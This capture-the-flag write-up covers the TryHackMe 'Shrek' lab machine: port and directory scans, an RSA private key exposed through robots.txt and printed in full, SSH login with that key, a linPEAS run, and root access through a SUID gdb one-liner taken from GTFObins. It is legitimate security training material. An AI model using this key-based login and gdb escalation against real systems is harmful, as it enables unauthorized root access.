# Shrek [6.9.2020][TryHackMe]

## Recon

### nmap

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.2
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/7.1.33)
3306/tcp open  mysql   MySQL (unauthorized)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
9999/tcp open  abyss?
```

### gobuster

```
/upload (Status: 301)
/cms (Status: 301)
/api (Status: 301)
/robots.txt (Status: 200)
```

## Web Enumeration

### shrek.thm/robots.txt

```
User-agent: *
Disallow: /Cpxtpt2hWCee9VFa.txt
```

#### /Cpxtpt2hWCee9VFa.txt

```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAsKHyvIOqmETYwUvLDAWg4ZXHb/oTgk7A4vkUY1AZC0S6fzNE
JmewL2ZJ6ioyCXhFmvlA7GC9iMJp13L5a6qeRiQEVwp6M5AYYsm/fTWXZuA2Qf4z
8o+cnnD+nswE9iLe5xPl9NvvyLANWNkn6cHkEOfQ1HYFMFP+85rmJ2o1upHkgcUI
ONDAnRigLz2IwJHeZAvllB5cszvmrLmgJWQg2DIvL/2s+J//rSEKyISmGVBxDdRm
T5ogSbSeJ9e+CfHtfOnUShWVaa2xIO49sKtu+s5LAgURtyX0MiB88NfXcUWC7uO0
Z1hd/W/rzlzKhvYlKPZON+J9ViJLNg36HqoLcwIDAQABAoIBABaM5n+Y07vS9lVf
RtIHGe4TAD5UkA8P3OJdaHPxcvEUWjcJJYc9r6mthnxF3NOGrmRFtDs5cpk2MOsX
u646PzC3QnKWXNmeaO6b0T28DNNOhr7QJHOwUA+OX4OIio2eEBUyXiZvueJGT73r
I4Rdg6+A2RF269yqrJ8PRJj9n1RtO4FPLsQ/5d6qxaHp543BMVFqYEWvrsdNU2Jl
VUAB652BcXpBuJALUV0iBsDxbqIKFl5wIsrTNWh+hkUTwo9HroQEVd4svCN+Jr5B
Npr81WG2jbKqOx2kJVFW/yCivmr/f/XokyOLBi4N/5Wqq+JuHD0zSPTtY5K04SUd
63TWQ5kCgYEA32IwfmDwGZBhqs3+QAH7y46ByIOa632DnZnFu2IqKySpTDk6chmh
ONSfc4coKwRq5T0zofHIKLYwO8vVpJq4iQ31r+oe7fAHh08w/mBC3ciCSi6EQdm5
RMxW0i4usAuneJ04rVmWWHepADB0BqYiByWtWFYAY9Kpks/ks9yWHn8CgYEAymxD
q3xvaWFycawJ+I/P5gW8+Wr1L3VrGbBRj1uPhNF0yQcA03ZjyyViDKeT/uBfCCxX
LPoLmoLYGmisl/MGq3T0g0TtrgvkFU6qZ3sjYJ+O/yrT06HYapJLv6Ns/+98uNvi
3VEQodZNII8P6WLk3RPp1NzDVcFDLmD9C40UAQ0CgYBokPgOUKZT8Sgm4mJ/5+3M
LZtHF4PvdEOmBJNw0dTXeUPesHNRcfnsNmulksEU0e6P/IQs7Jc7p30QoKwTb3Gu
hmBZxohP7So5BrLygHEMjI2g2AGFKbv2HokNvhyQwAPXDBG549Pi+bCcrBHEAwSu
v85TKX7pO3WxiauPHlUPVQKBgFmIF0ozKKgIpPDoMiTRnxfTc+kxyK6sFanwFbL9
wXXymuALi+78D1mb+Ek2mbwDC6V2zzwigJ1fwCu2Hpi6sjmF6lxhUWtI8SIHgFFy
4ovrJvlvvO9/R1SjzoM9yolNKPIut6JCJ8QdIFIFVPlad3XdR/CRkIhOieNqnKHO
TYnFAoGAbRrJYVZaJhVzgg7H22UM+sAuL6TR6hDLqD2wA1vnQvGk8qh95Mg9+M/X
6Zmia1R6Wfm2gIGirxK6s+XOpfqKncFmdjEqO+PHr4vaKSONKB0GzLI7ZlOPPU5V
Q2FZnCyRqaHlYUKWwZBt2UYbC46sfCWapormgwo3xA8Ix/jrBBI=
-----END RSA PRIVATE KEY-----
```

### ssh2john.py

```
# python3 ssh2john.py /home/kali/key.pem
ssh2john.py:103: DeprecationWarning: decodestring() is a deprecated alias since Python 3.1, use decodebytes()
  data = base64.decodestring(data)
/home/kali/key.pem has no password!
```

Here we can see that there is no password for the ssh key.

## SSH

Took a random guess because it's called Shrek.

```
# ssh -i key.pem shrek@shrek.thm
Last login: Tue Jun  9 23:03:29 2020 from ip-10-1-122-133.eu-west-1.compute.internal
[shrek@shrek ~]$ 
```

### ls

```bash
$ ls
check.sh  flag.txt
```

### LinPEAS

From here I downloaded linPEAS from github to find any vulnerabilities.

```
# git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git
```

#### scp

I needed to get this file onto here

```
# scp -i key.pem linpeas.sh shrek@shrek.thm:/home/shrek
```

Afterwards it looked like this:

```
$ ls
check.sh  flag.txt  linpeas.sh
```

#### linPEAS.sh

```bash
$ sh linpeas.sh
====================================( Interesting Files )=====================================
[+] SUID - Check easy privesc, exploits and write perms
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
/usr/bin/chfn		--->	SuSE_9.3/10
/usr/bin/chsh
/usr/bin/mount		--->	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp		--->	HP-UX_10.20
/usr/bin/su
/usr/bin/umount		--->	BSD/Linux(08-1996)
/usr/bin/sudo		--->	/sudo$
/usr/bin/pkexec		--->	Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
/usr/bin/gdb
/usr/bin/crontab
/usr/bin/run-parts
/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
/usr/bin/wall
/usr/bin/write
/usr/bin/gdb
/usr/bin/run-parts
/usr/bin/ssh-agent
/usr/sbin/netreport
/usr/sbin/postdrop
/usr/sbin/postqueue
/usr/libexec/utempter/utempter
/usr/libexec/openssh/ssh-keysign
```

You can't see it here, but the most interesting part was gdb.

After looking on GTFObins, you can find this gdb privilege escalation:

```
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
```

Here's the result:

```
[shrek@shrek ~]$ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
GNU gdb (GDB) Red Hat Enterprise Linux 7.6.1-115.el7
Copyright (C) 2013 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-redhat-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
sh-4.2# 
```

From here we can find all the flags and defend the title.
